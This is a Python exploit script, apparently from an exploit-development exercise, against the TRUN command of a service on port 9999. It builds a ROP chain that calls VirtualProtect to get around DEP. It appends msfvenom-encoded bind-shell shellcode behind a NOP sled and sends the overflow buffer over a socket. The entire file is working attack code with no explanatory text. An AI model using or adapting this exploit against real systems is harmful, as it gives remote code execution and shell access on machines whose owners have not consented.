#!/usr/bin/python
import socket,sys,struct
host="172.16.208.155"
port=9999

def create_rop_chain():
	rop_gadgets = [
	0x62501022, # RETN

	# ROP Gadget for ECX
	0x77eb78a1, # PUSH ESP | POP EBP| RETN0x4
	0x7c80aee4, # XCHG EAX,EBP 
	0xDEADBEEF, # dummy
	0x77c14001, # XCHG EAX,ECX # RETN

	# ROP Gadget for EDX
	0x77c58f9c, # XCHG EAX,EDX # RETN
	0x77EECCD9, # POP EAX | RETN
	0xFFFFFFC0, # value to negate, becomes 0x40
	0x77d74960, # NEG EAX # RETN
	0x77c58f9c, # XCHG EAX,EDX # RETN

	# ROP Gadget for EBX
	0x77dfb406, # XOR EAX,EAX # RETN
	0x77EECCD9, # POP EAX | RETN
	0xFFFFFCE0, # value to negate, becomes 0x320
	0x77d74960, # NEG EAX # RETN
	0x7c87f898, # XCHG EAX,EBX # ADD EAX,C033FFF9 # POP EDI # POP ESI # POP EBP # RETN 0x0C 
	0xDEADBEEF, # for dummy pop EDI
	0xDEADBEEF, # for dummy pop ESI
	0xDEADBEEF, # for dummy pop EBP

	# ROP Gadget for EBP
	0x77EED887, # PUSH ESP | POP EBP | RETN0x4
	0xDEADBEEF, #dummy
	0xDEADBEEF, #dummy
	0xDEADBEEF, #dummy
	0x7c80aee4, # XCHG EAX,EBP # RETN
	0xDEADBEEF, # dummy
	0x77c4ec0b, # ADD EAX,100 # POP EBP # RETN
	0xDEADBEEF, # dummy
	0x7c80aee4, # XCHG EAX,EBP # RETN

	# ROP Gadget for ESI
	0x662cd821, # POP ESI | RETN
	0x7C801AD0, # address of VirtualProtect()

	# ROP Gadget for EDI
	0x77c2a80a, # POP EDI | RETN
	0x62501022, # ROP NOP

	# ROP Gadget for EAX
	0x7c87f221, # POP EAX | RETN 0x4
	0x62501022, # ROP NOP


	0x7c92751b, # PUSHAD | RETN
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

# ┌──(kali㉿kali)-[~]
# └─$ msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 336 (iteration=0)
# x86/shikata_ga_nai chosen with final size 336
# Payload size: 336 bytes
# Final size of python file: 1641 bytes
buf =  ""
buf += "\xba\x43\x92\xf3\xb7\xd9\xc8\xd9\x74\x24\xf4\x5d\x31"
buf += "\xc9\xb1\x4e\x31\x55\x13\x03\x55\x13\x83\xc5\x47\x70"
buf += "\x06\x4b\xaf\xf6\xe9\xb4\x2f\x97\x60\x51\x1e\x97\x17"
buf += "\x11\x30\x27\x53\x77\xbc\xcc\x31\x6c\x37\xa0\x9d\x83"
buf += "\xf0\x0f\xf8\xaa\x01\x23\x38\xac\x81\x3e\x6d\x0e\xb8"
buf += "\xf0\x60\x4f\xfd\xed\x89\x1d\x56\x79\x3f\xb2\xd3\x37"
buf += "\xfc\x39\xaf\xd6\x84\xde\x67\xd8\xa5\x70\xfc\x83\x65"
buf += "\x72\xd1\xbf\x2f\x6c\x36\x85\xe6\x07\x8c\x71\xf9\xc1"
buf += "\xdd\x7a\x56\x2c\xd2\x88\xa6\x68\xd4\x72\xdd\x80\x27"
buf += "\x0e\xe6\x56\x5a\xd4\x63\x4d\xfc\x9f\xd4\xa9\xfd\x4c"
buf += "\x82\x3a\xf1\x39\xc0\x65\x15\xbf\x05\x1e\x21\x34\xa8"
buf += "\xf1\xa0\x0e\x8f\xd5\xe9\xd5\xae\x4c\x57\xbb\xcf\x8f"
buf += "\x38\x64\x6a\xdb\xd4\x71\x07\x86\xb0\xb6\x2a\x39\x40"
buf += "\xd1\x3d\x4a\x72\x7e\x96\xc4\x3e\xf7\x30\x12\x41\x22"
buf += "\x84\x8c\xbc\xcd\xf5\x85\x7a\x99\xa5\xbd\xab\xa2\x2d"
buf += "\x3e\x54\x77\xdb\x35\xf3\x28\xfe\xb7\x69\xc8\x94\x45"
buf += "\x05\x20\x67\x95\x35\x4b\xad\xbe\xdd\xb6\x4e\xd0\x41"
buf += "\x3e\xa8\xb8\x69\x16\x62\x55\x4b\x4d\xbb\xc2\xb4\xa7"
buf += "\x41\xcc\x3f\x10\x1d\xa5\x08\x49\x99\xca\x89\x5f\x8d"
buf += "\x5c\x01\x8c\x09\x7c\x16\x99\x39\xe9\x80\x57\xa8\x58"
buf += "\x31\x67\xe1\x09\xb1\xfd\x0e\x98\xe6\x69\x0d\xfd\xc0"
buf += "\x35\xee\x28\x53\x31\x10\xad\x7e\x49\x27\x3b\xc0\x25"
buf += "\x48\xab\xc0\xb5\x1e\xa1\xc0\xdd\xc6\x91\x93\xf8\x08"
buf += "\x0c\x80\x50\x9d\xaf\xf0\x05\x36\xd8\xfe\x70\x70\x47"
buf += "\x01\x57\x02\x80\xfd\x26\x02\x70\x3e\xff\xca\x07\x29"
buf += "\xc3\x68\x17\x1c\x66\xd8\xb2\x5e\x34\x1a\x97"

shellcode = '\x90'*250 + buf
payload = "A"*2003 + rop_chain + shellcode
buffer = "TRUN /.:/" + payload



expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(buffer)
expl.close()
